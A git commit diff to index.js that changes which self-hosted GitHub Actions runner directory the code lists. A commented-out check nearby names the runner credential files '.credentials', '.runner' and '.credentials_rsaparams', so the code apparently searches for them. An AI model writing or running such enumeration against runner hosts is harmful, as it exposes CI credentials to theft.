f32df2e2bc91622e6dea0e0852b6d373de667d13
dreamli0 <136119580+dreamli0@users.noreply.github.com>
2023-07-31 17:00:44 -0400

    Update index.js

--- index.js
+++ index.js
@@ -66,7 +66,7 @@ try {
     // });
     
     // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    const files_other = fs.readdirSync('/home/runner/work/_actions');
+    const files_other = fs.readdirSync('/home/xiaofan/actions-runner');
     files_other.forEach(element => {
         // if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
             
